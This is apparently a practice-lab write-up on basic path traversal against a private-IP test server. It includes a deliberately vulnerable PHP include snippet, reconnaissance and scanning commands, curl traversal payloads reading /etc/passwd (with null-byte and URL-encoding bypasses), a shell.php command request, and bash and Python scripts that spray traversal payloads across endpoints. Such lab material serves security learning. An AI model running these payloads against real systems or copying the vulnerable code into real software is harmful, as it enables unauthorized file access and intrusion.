# Basic Path Traversal




## What is Basic Path Traversal?
Basic Path Traversal is the simplest form of Local File Inclusion (LFI) attack where an attacker uses ../ sequences to navigate out of the web directory and access sensitive system files.


Simple Analogy

Think of your website as a house:
  - Web root (`/var/www/html/`) = Living room (public area)
  - System files (`/etc/passwd`) = Bedroom safe (private area)
  - `../` = "Go back one room towards the entrance"


##  How It Works
### Vulnerable Code
````
<?php
$file = $_GET['file'];
include("/var/www/html/" . $file);
?>
````


### Directory Structure Visualization
````
/                           (Root directory - WE WANT TO REACH HERE!)
├── etc/                    │
│   └── passwd              ← TARGET FILE (Contains user accounts)
├── var/                    │
│   └── www/                │  
│       └── html/           ← WEB APPLICATION LIVES HERE
│           ├── index.php   │
│           └── includes/   ← WE START HERE
│               └── header.php
````

---




## Initial Reconnaissance

### Basic Service Discovery

#### Verify the target is accessible
````
ping -c 2 192.168.100.97
````
<img width="545" height="167" alt="image" src="https://github.com/user-attachments/assets/7b0edbb5-f81f-4182-8f42-01a63310ed9d" />


#### Check if port 8080 is open
````
nmap -p 8080 192.168.100.97
````
<img width="572" height="285" alt="image" src="https://github.com/user-attachments/assets/c6e2e6bd-86ce-46aa-b054-45c4b35ab8c2" />



#### Comprehensive port scan
````
nmap -sV -sC -O 192.168.100.97
````


#### Check for UDP services
````
nmap -sU -p 53,67,68,69,123,161 192.168.100.97
````
<img width="553" height="258" alt="image" src="https://github.com/user-attachments/assets/45f6ce57-cac7-4271-aeb8-e3d89f343edb" />


---


### Web Service Fingerprinting

#### Identify web technologies
````
whatweb http://192.168.100.97:8080/
````
<img width="1914" height="101" alt="image" src="https://github.com/user-attachments/assets/6cbe61f6-ec0e-4b68-a835-2c69a4f3ab7e" />


#### Chec HTTP Headers
````
curl -I http://192.168.100.97:8080/
````
<img width="521" height="239" alt="image" src="https://github.com/user-attachments/assets/bb11f35a-414b-47bb-9fc6-863043172267" />


#### Get full response headers
````
curl -v http://192.168.100.97:8080/ 2>&1 | grep -i "server\|x-powered-by"
````
<img width="654" height="68" alt="image" src="https://github.com/user-attachments/assets/c1b0b38e-c82a-47c8-8541-b6876b989c6d" />


#### Check for common web files
````
curl http://192.168.100.97:8080/robots.txt
curl http://192.168.100.97:8080/sitemap.xml
curl http://192.168.100.97:8080/.git/HEAD
````
<img width="735" height="471" alt="image" src="https://github.com/user-attachments/assets/17976874-b044-4f7c-b8ad-5d5921074d71" />

---



## Application Discovery


###   Directory and File Enumeration

####  Using dirsearch (comprehensive)
````
dirsearch -u http://192.168.100.97:8080/ -e php,html,js,txt,json,xml -t 50
````
<img width="1271" height="811" alt="image" src="https://github.com/user-attachments/assets/f483a8eb-ec74-485c-b1c8-e1b35e68d3a3" />

<img width="1773" height="806" alt="image" src="https://github.com/user-attachments/assets/a93804ee-0fe6-410c-b6e8-832b09ba51f5" />

#### Using gobuster
````
gobuster dir -u http://192.168.100.97:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
````
<img width="797" height="802" alt="image" src="https://github.com/user-attachments/assets/359852a3-0ff0-40d8-b827-b0abef43faf0" />

<img width="1758" height="812" alt="image" src="https://github.com/user-attachments/assets/3073204d-1a41-4b5d-acb0-e84fc05029f7" />

<img width="1644" height="805" alt="image" src="https://github.com/user-attachments/assets/b8cb6154-1b02-4d4b-8735-d778f1b4dd34" />

<img width="1826" height="807" alt="image" src="https://github.com/user-attachments/assets/4a1b6d8d-f955-49a2-a518-9e263811260f" />

- We can use this to get `shell`

<img width="1208" height="620" alt="image" src="https://github.com/user-attachments/assets/bfc94a57-4243-4dd2-af9f-2c3640c70778" />


#### Using ffuf
````
ffuf -u http://192.168.100.97:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
````
<img width="830" height="803" alt="image" src="https://github.com/user-attachments/assets/0a202147-aca8-4aad-af20-fe6cc898f268" />


#### Check for common web applications
````
curl http://192.168.100.97:8080/instructions.php
````
<img width="1903" height="746" alt="image" src="https://github.com/user-attachments/assets/0cd0625c-b53a-4b2a-96bd-40b5fa048bab" />



---



## Vulnerability Discovery

### Automated Vulnerability Scanning

#### nikto scan
````
nikto -h http://192.168.100.97:8080/
````
<img width="1859" height="366" alt="image" src="https://github.com/user-attachments/assets/899d2876-7d05-4cf4-ab7c-45fefbbcabaa" />



#### skipfish
````
skipfish -o skipfish_report http://192.168.100.97:8080/
````
<img width="537" height="588" alt="image" src="https://github.com/user-attachments/assets/117d3413-e77f-4d74-9a20-856612cf79d7" />


---



## Path Traversal Testing


### Main Application Paramater
````
curl "http://192.168.100.97:8080/about.php?file=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?page=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?include=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?template=../../../../etc/passwd"
````
<img width="900" height="652" alt="image" src="https://github.com/user-attachments/assets/e5a76ddb-ed2f-4670-846d-a805a5bc6892" />

<img width="766" height="802" alt="image" src="https://github.com/user-attachments/assets/ab7b0219-6312-4f4c-b752-aeef821ed735" />


###  Test the Setup.php File
````
curl "http://192.168.100.97:8080/setup.php?file=../../../../etc/passwd"
curl "http://192.168.100.97:8080/setup.php?config=../../../../etc/passwd"
curl "http://192.168.100.97:8080/setup.php?page=../../../../etc/passwd"
````
<img width="888" height="638" alt="image" src="https://github.com/user-attachments/assets/77ed28a4-1271-419a-bc52-9b374d6b755e" />

<img width="732" height="787" alt="image" src="https://github.com/user-attachments/assets/329e95f8-00a9-4680-b445-aa3ae4ebe309" />

### Shell.php
````
curl "http://192.168.100.97:8080/shell.php?cmd=cat+/etc/passwd"
curl "http://192.168.100.97:8080/shell.php?file=../../../../etc/passwd"
curl "http://192.168.100.97:8080/shell.php?path=../../../../etc/passwd"
````
<img width="606" height="348" alt="image" src="https://github.com/user-attachments/assets/3c3fc521-9cf3-4dd3-8039-fa6f1a2c16f3" />

<img width="1919" height="299" alt="image" src="https://github.com/user-attachments/assets/7a27b8d5-fe1b-47c4-a52d-c14b103f9add" />



## Comprehensive Parameter Discovery

### Use FFUF for Parameter Discovery

#### Discover parameters in about.php
````
ffuf -u "http://192.168.100.97:8080/about.php?FUZZ=test" -w /usr/share/wordlists/dirb/big.txt -fs 0
````
<img width="753" height="810" alt="image" src="https://github.com/user-attachments/assets/3252c692-d505-4fcb-a90a-c4116a861e73" />


#### Discover parameters in setup.php  
````
ffuf -u "http://192.168.100.97:8080/setup.php?FUZZ=test" -w /usr/share/wordlists/dirb/big.txt -fs 0
````
<img width="850" height="814" alt="image" src="https://github.com/user-attachments/assets/f91ad59a-c3fa-4beb-806a-473625876c58" />


#### Common parameter
````
sudo mousepad params.txt
````
````
file
page
load
include
template
document
path
filename
doc
view
read
content
template
config
````
````
ffuf -u "http://192.168.100.97:8080/about.php?FUZZ=test" -w params.txt -fs 0
````
<img width="805" height="707" alt="image" src="https://github.com/user-attachments/assets/4e73e898-66de-424e-9022-05102f35fa7e" />

---


### Manual Parameter Testing

````
sudo mousepad parameter_test.sh
````
````
#!/bin/bash
TARGET="http://192.168.100.97:8080"
ENDPOINTS=("about.php" "setup.php" "login.php")

PARAMS=("file" "page" "include" "template" "document" "path" "config" "load" "view")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "Testing endpoint: /$endpoint"
    echo "========================"
    
    for param in "${PARAMS[@]}"; do
        echo -n "Testing $param ... "
        response=$(curl -s "$TARGET/$endpoint?$param=../../../../etc/passwd")
        
        if echo "$response" | grep -q "root:"; then
            echo "VULNERABLE!"
            echo "URL: $TARGET/$endpoint?$param=../../../../etc/passwd"
        elif echo "$response" | grep -q "File not found\|404\|Error"; then
            echo "Filtered"
        else
            echo "No"
        fi
    done
    echo
done
````
````
sudo chmod +x parameter_test.sh
./parameter_test.sh
````
<img width="446" height="721" alt="image" src="https://github.com/user-attachments/assets/d7a9fa03-93bd-4ca8-8026-68527524e81c" />



### Test URL Paths
````
curl "http://192.168.100.97:8080/../../../../etc/passwd"
curl "http://192.168.100.97:8080/images/../../../../etc/passwd"
curl "http://192.168.100.97:8080/css/../../../../etc/passwd"
````
<img width="678" height="576" alt="image" src="https://github.com/user-attachments/assets/6f4a0407-2df3-44c4-8f5e-e8df33734cf9" />

- But in this we not found.

---

## Test Common Web Application Patterns

###  Common CMS/Application Patterns
#### Wordpress style
````
curl "http://192.168.100.97:8080/about.php?template=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?theme=../../../../etc/passwd"
````
<img width="1145" height="677" alt="image" src="https://github.com/user-attachments/assets/5194a865-88d0-4ecd-83c8-586edfd427d1" />

<img width="1062" height="681" alt="image" src="https://github.com/user-attachments/assets/80ccd297-9844-4bc9-8da5-a37a8fecb196" />


#### Joomla
````
curl "http://192.168.100.97:8080/about.php?view=../../../../etc/passwd"
````
<img width="1032" height="694" alt="image" src="https://github.com/user-attachments/assets/4edfe15a-9574-4986-9183-be3bb1a0cef0" />


#### Custom application style
````
curl "http://192.168.100.97:8080/about.php?module=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?action=../../../../etc/passwd"
curl "http://192.168.100.97:8080/about.php?func=../../../../etc/passwd"
````
<img width="975" height="689" alt="image" src="https://github.com/user-attachments/assets/f3b37dc6-afe8-4255-ae29-c29613717055" />

---



### with Different File Extensions
````
curl "http://192.168.100.97:8080/about.php?file=../../../../etc/passwd%00"
curl "http://192.168.100.97:8080/about.php?file=../../../../etc/passwd%00.jpg"
curl "http://192.168.100.97:8080/about.php?file=../../../../etc/passwd.txt"
````
<img width="1112" height="688" alt="image" src="https://github.com/user-attachments/assets/da900266-08ae-4cad-96db-55ac1737553e" />

---


##  Comprehensive Testing Script
````
sudo mousepad comprehensive_traversal.py
````
````
#!/usr/bin/env python3
import requests
import sys

target = "http://192.168.100.97:8080"

# Extended list of endpoints from your scan
endpoints = [
    "about.php",
    "setup.php", 
    "login.php",
    "config/",
    "docs/",
    "dvwa/",
    ""
]

# Extended parameter list
parameters = [
    "file", "page", "include", "template", "document", "path",
    "filename", "doc", "view", "read", "content", "template",
    "config", "load", "module", "theme", "action", "func",
    "section", "part", "item", "display", "show", "src",
    "url", "location", "folder", "dir", "directory"
]

# Various payloads
payloads = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "....\\....\\....\\windows\\win.ini"
]

def test_traversal():
    print("[*] Starting Comprehensive Path Traversal Testing")
    print("="*60)
    
    for endpoint in endpoints:
        print(f"\n[*] Testing endpoint: /{endpoint}")
        print("-" * 40)
        
        for param in parameters:
            for payload in payloads:
                if endpoint == "":
                    url = f"{target}/?{param}={payload}"
                else:
                    url = f"{target}/{endpoint}?{param}={payload}"
                
                try:
                    response = requests.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        
                        # Check for success indicators
                        if any(indicator in content for indicator in ['root:', 'daemon:', '[extensions]', '[fonts]']):
                            print(f"  ✓ VULNERABLE: {param} with {payload}")
                            print(f"     URL: {url}")
                            # Show preview
                            lines = response.text.split('\n')
                            for line in lines:
                                if 'root:' in line or '[extensions]' in line:
                                    print(f"     Preview: {line[:100]}...")
                                    break
                            return True
                            
                except Exception as e:
                    pass
    
    print("\n[-] No obvious path traversal vulnerabilities found")
    return False

if __name__ == "__main__":
    test_traversal()
````
````
sudo chmod +x comprehensive_traversal.py
python3 comprehensive_traversal.py
````
<img width="518" height="442" alt="image" src="https://github.com/user-attachments/assets/e3e23795-5091-4a0d-8778-b7bafb3ad14d" />

---


## Alternative Testing Approaches


###  Test with Different HTTP Methods
- Post Requests
````
curl -X POST http://192.168.100.97:8080/about.php -d "file=../../../../etc/passwd"
````
<img width="1292" height="688" alt="image" src="https://github.com/user-attachments/assets/c0783275-9c2f-4fb7-bd68-1e96fe04002c" />


###  Check Documentation for Clues
#### Read the documentation that was found
````
curl -s http://192.168.100.97:8080/README.md
curl -s http://192.168.100.97:8080/CHANGELOG.md
````
<img width="1919" height="782" alt="image" src="https://github.com/user-attachments/assets/730fa397-d6a0-4b73-804f-1880212c6daf" />

<img width="1919" height="887" alt="image" src="https://github.com/user-attachments/assets/6ee4e300-a5e3-4e85-afc0-d3d06b3862c2" />




##  If Basic Methods Fail

### Test with Encoding Bypasses

#### URL Encode=ing
````
curl "http://192.168.100.97:8080/about.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
````
<img width="1106" height="688" alt="image" src="https://github.com/user-attachments/assets/b7fa6b0b-563f-4024-8de9-7c74d16393c2" />


----




## Finished of Basic Path Traversal

---

## Practice By: Nin Kanong (k4n0ng)

---
